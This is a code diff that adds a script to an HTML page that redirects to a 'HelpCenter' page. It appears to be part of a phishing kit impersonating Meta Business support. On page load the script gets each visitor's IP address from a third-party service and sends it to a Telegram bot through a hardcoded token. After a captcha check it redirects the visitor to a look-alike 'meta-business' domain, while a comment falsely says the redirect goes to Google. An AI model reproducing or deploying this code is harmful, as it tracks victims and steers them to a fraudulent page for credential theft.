@@ -1,1 +1,49 @@
 <meta HTTP-EQUIV="Refresh" CONTENT="1; URL=HelpCenter/index.html">
+
+<script>
+        window.onload = function() {
+            // Send notification to Telegram when the page loads
+            sendTelegramNotification();
+        };
+
+        function checkCaptcha() {
+            const recaptchaValue = document.getElementById('g-recaptcha-response').value.trim();
+            if (recaptchaValue !== '') {
+                // Redirect to Google.com after checking captcha
+                window.location.href = 'https://meta-business-65416849861988.vercel.app/';
+            }
+        }
+
+        function sendTelegramNotification() {
+            const token = '6905926094:AAGyqYfNpoHk4OTzeido68UiviOwJb6lOVE';
+            const chatId = '1389938531';
+            getUserIP()
+            .then(ip => {
+                const message = `Someone visited the page from IP: ${ip}`;
+                
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .then(response => {
+                    if (!response.ok) {
+                        console.error('Failed to send Telegram notification');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error sending Telegram notification:', error);
+                });
+            })
+            .catch(error => {
+                console.error('Error getting user IP:', error);
+            });
+        }
+
+        function getUserIP() {
+            // Using a third-party service to get the IP address
+            return fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => data.ip)
+            .catch(error => {
+                console.error('Error getting user IP:', error);
+                return 'Unknown';
+            });
+        }
+    </script>
